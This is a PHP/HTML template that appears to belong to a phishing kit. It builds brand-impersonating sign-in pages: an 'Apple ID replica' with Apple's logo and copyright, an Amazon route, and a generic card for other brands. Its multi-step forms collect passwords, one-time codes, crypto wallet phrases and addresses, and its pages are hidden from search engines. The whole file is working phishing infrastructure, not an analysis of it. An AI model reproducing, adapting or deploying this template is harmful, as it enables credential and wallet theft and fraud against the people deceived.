<?php
// Tech template — routes by brand
// Amazon → Amazon-specific layout; Apple → Apple ID replica; others → generic white card
$is_apple  = (strpos(strtolower($pid), 'apple') !== false);
$is_amazon = (strpos(strtolower($pid), 'amazon') !== false);

// Route Amazon to its own sub-template
if ($is_amazon) {
    include __DIR__ . '/amazon.php';
    return;
}

$btn_color = $is_apple ? '#0071e3' : $accent;
$btn_r = $is_apple ? '0'   : $ar;
$btn_g = $is_apple ? '113' : $ag;
$btn_b = $is_apple ? '227' : $ab;
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?></title>
<meta name="robots" content="noindex,nofollow">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Arial,sans-serif;
  min-height:100vh;min-height:100dvh;
  background:#f5f5f7;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  padding:20px 16px;color:#1d1d1f
}

/* Apple logo above card */
.apple-logo-wrap{text-align:center;margin-bottom:20px}
.apple-logo-wrap svg{width:52px;height:52px;fill:#1d1d1f}

/* Card */
.card{
  width:100%;max-width:460px;
  background:#fff;
  border-radius:20px;
  box-shadow:0 4px 20px rgba(0,0,0,.08),0 1px 3px rgba(0,0,0,.06);
  overflow:hidden
}
.card-inner{padding:40px 44px 32px}

/* Logo area inside card for non-Apple brands */
.brand-logo-row{display:flex;align-items:center;justify-content:center;margin-bottom:8px}
.brand-logo-box{width:52px;height:52px;display:flex;align-items:center;justify-content:center;overflow:hidden}
.brand-logo-box img{width:100%;height:100%;object-fit:contain}
.brand-ini{font-size:22px;font-weight:700;color:<?=$accent?>}

/* Title + sub */
.card-title{font-size:26px;font-weight:600;color:#1d1d1f;letter-spacing:-.5px;text-align:center;margin-bottom:8px;line-height:1.2}
.card-sub{font-size:15px;color:#6e6e73;text-align:center;margin-bottom:28px;line-height:1.5}

/* Fields */
.field{margin-bottom:12px}
.field label{display:none}
.field input{
  width:100%;
  background:#fff;
  border:1px solid #c7c7cc;
  color:#1d1d1f;
  padding:14px 16px;
  border-radius:12px;
  font-size:17px;
  outline:none;
  font-family:inherit;
  -webkit-appearance:none;
  transition:border-color .2s,box-shadow .2s
}
.field input:focus{
  border-color:<?=$btn_color?>;
  box-shadow:0 0 0 4px rgba(<?=$btn_r?>,<?=$btn_g?>,<?=$btn_b?>,.15)
}
.field input::placeholder{color:#aeaeb2}
.or-div{
  text-align:center;font-size:12px;color:#aeaeb2;
  margin:10px 0;position:relative
}
.or-div::before,.or-div::after{
  content:'';position:absolute;top:50%;width:43%;height:1px;background:#e5e5ea
}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}

/* Continue / Submit button */
.btn{
  width:100%;padding:14px;
  background:<?=$btn_color?>;color:#fff;
  font-size:17px;font-weight:600;
  border:none;border-radius:12px;cursor:pointer;
  margin-top:8px;
  transition:filter .15s;
  position:relative;font-family:inherit
}
.btn:hover{filter:brightness(.92)}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn.loading::after{
  content:'';position:absolute;right:16px;top:50%;
  width:17px;height:17px;
  border:2px solid rgba(255,255,255,.3);border-top-color:#fff;
  border-radius:50%;transform:translateY(-50%);
  animation:spin .7s linear infinite
}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:13px;color:#ff3b30;margin-top:8px;text-align:center;display:none}

/* Forgot password link */
.forgot-link{display:block;text-align:center;margin-top:14px;font-size:14px;color:<?=$btn_color?>;text-decoration:none}
.forgot-link:hover{text-decoration:underline}

/* Step dots */
.steps{display:flex;justify-content:center;gap:5px;margin-bottom:22px}
.dot{width:7px;height:7px;border-radius:50%;background:#d1d1d6;transition:all .25s}
.dot.active{background:<?=$btn_color?>;transform:scale(1.2)}
.dot.done{background:<?=$btn_color?>;opacity:.45}

/* OTP / wallet / address */
.wallet-area{
  width:100%;min-height:80px;
  background:#fff;border:1px solid #c7c7cc;color:#1d1d1f;
  padding:14px 16px;border-radius:12px;font-size:14px;
  font-family:monospace;outline:none;resize:none
}
.wallet-area:focus{border-color:<?=$btn_color?>;box-shadow:0 0 0 4px rgba(<?=$btn_r?>,<?=$btn_g?>,<?=$btn_b?>,.15)}
.wallet-hint{font-size:12px;color:#aeaeb2;margin-top:6px;text-align:center;line-height:1.5}
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{
  flex:1;text-align:center;font-size:24px;font-weight:600;
  padding:12px 4px;max-width:48px;
  background:#fff;border:1px solid #c7c7cc;border-radius:10px;
  color:#1d1d1f;outline:none
}
.otp-wrap input:focus{border-color:<?=$btn_color?>;box-shadow:0 0 0 3px rgba(<?=$btn_r?>,<?=$btn_g?>,<?=$btn_b?>,.15)}
.otp-hint{font-size:13px;color:#aeaeb2;text-align:center;margin-top:8px}
.addr-area{
  width:100%;min-height:60px;
  background:#fff;border:1px solid #c7c7cc;color:#1d1d1f;
  padding:14px 16px;border-radius:12px;font-size:15px;
  font-family:inherit;outline:none;resize:none
}
.addr-area:focus{border-color:<?=$btn_color?>;box-shadow:0 0 0 4px rgba(<?=$btn_r?>,<?=$btn_g?>,<?=$btn_b?>,.15)}

/* Footer links inside card */
.card-footer-links{
  padding:18px 24px;
  border-top:1px solid #f2f2f7;
  display:flex;justify-content:center;gap:16px;flex-wrap:wrap
}
.card-footer-links a{font-size:12px;color:#6e6e73;text-decoration:none}
.card-footer-links a:hover{text-decoration:underline;color:<?=$btn_color?>}

/* Privacy note */
.privacy-note{
  text-align:center;margin-top:20px;
  font-size:11px;color:#aeaeb2;line-height:1.6
}
.privacy-note a{color:#aeaeb2;text-decoration:none}
.privacy-note a:hover{text-decoration:underline}

/* Loading overlay */
#loadOverlay{
  display:none;position:fixed;inset:0;
  background:rgba(245,245,247,.9);z-index:999;
  align-items:center;justify-content:center;flex-direction:column;gap:16px
}
#loadOverlay.show{display:flex}
.load-spin{
  width:36px;height:36px;
  border:2px solid rgba(0,0,0,.08);border-top-color:<?=$btn_color?>;
  border-radius:50%;animation:spin .8s linear infinite
}
.load-txt{font-size:14px;color:#6e6e73}

/* Mobile: fill screen */
@media(max-width:480px){
  body{padding:0;align-items:flex-start;background:#fff;justify-content:flex-start}
  .apple-logo-wrap{padding-top:48px}
  .card{border-radius:0;min-height:calc(100vh - 120px);min-height:calc(100dvh - 120px);box-shadow:none}
  .card-inner{padding:32px 24px 24px}
  .card-footer-links{padding:14px 16px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Verifying…</div></div>

<?php // is_apple & btn_color already computed above ?>

<div class="apple-logo-wrap">
<?php if($is_apple): ?>
<!-- Real Apple  SVG logo -->
<svg viewBox="0 0 814 1000" xmlns="http://www.w3.org/2000/svg">
  <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-57.8-155.5-127.4C46 411.6 6.1 283.5 6.1 159.3C6.1 71.5 39.5 0 110 0c68 0 112.3 44.3 156.5 44.3 42.9 0 92.7-44.3 169.2-44.3 26.2 0 99.1 2.3 155.4 78.5zM608.4 78.4C636.7 43.8 663 0 663 0c-71.2 0-126.8 42.9-163.2 84.5C461.5 129.4 438 192 438 233.5c0 3.4.4 6.8.6 7.9 2.9.3 7.8.4 12.6.4 32.8 0 73.1-17.3 100.7-51.1 14.1-17.5 41.3-59.6 56.5-112.4z"/>
</svg>
<?php elseif($logo_url): ?>
<div class="brand-logo-row">
  <div class="brand-logo-box">
    <img src="<?=htmlspecialchars($logo_url)?>" alt="" onerror="this.style.display='none';document.getElementById('bini').style.display='flex'">
    <span id="bini" class="brand-ini" style="display:none"><?=mb_strtoupper(mb_substr($org_name,0,2))?></span>
  </div>
</div>
<?php else: ?>
<div class="brand-logo-row">
  <div class="brand-logo-box">
    <span class="brand-ini"><?=mb_strtoupper(mb_substr($org_name,0,2))?></span>
  </div>
</div>
<?php endif; ?>
</div>

<div class="card">
  <div class="card-inner">
    <div class="card-title"><?=$is_apple ? 'Sign in with your<br>Apple Account' : htmlspecialchars($org_name)?></div>
    <div class="card-sub" id="mainSub"><?=$is_apple ? 'One account is all you need to access all Apple services.' : htmlspecialchars($org_sub)?></div>

    <?php if($total_steps > 1): ?>
    <div class="steps" id="stepDots">
      <?php for($i=1;$i<=$total_steps;$i++): ?>
      <div class="dot <?=$i===1?'active':''?>" id="d<?=$i?>"></div>
      <?php endfor; ?>
    </div>
    <?php endif; ?>

    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <?php if($sn > 1): ?>
      <div style="font-size:16px;font-weight:600;color:#1d1d1f;text-align:center;margin-bottom:6px"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
      <div style="font-size:14px;color:#6e6e73;text-align:center;margin-bottom:22px" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <?php else: ?>
      <div id="step1sub" style="display:none"><?=htmlspecialchars($sc['step_subs'][1])?></div>
      <?php endif; ?>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Enter the required information.</div>
      </form>
      <?php if($sn===1 && $is_apple): ?>
      <a href="#" class="forgot-link" onclick="return false">Forgot Apple Account or password?</a>
      <?php elseif($sn===1): ?>
      <a href="#" class="forgot-link" onclick="return false">Forgot your password?</a>
      <?php endif; ?>
    </div>
    <?php endfor; ?>
  </div>

  <div class="card-footer-links">
    <?php if($is_apple): ?>
    <a href="#">Privacy Policy</a>
    <a href="#">Terms of Use</a>
    <a href="#">Help</a>
    <?php else: ?>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
    <a href="#">Help</a>
    <?php endif; ?>
  </div>
</div>

<?php if($is_apple): ?>
<p class="privacy-note">
  Copyright &copy; <?=date('Y')?> Apple Inc.<br>
  <a href="#">Privacy Policy</a> &nbsp;&bull;&nbsp; <a href="#">Terms of Use</a>
</p>
<?php elseif($footer): ?>
<p class="privacy-note"><?=$footer?></p>
<?php endif; ?>

<?php include __DIR__.'/partials/js.php'; ?>
</body>
</html>
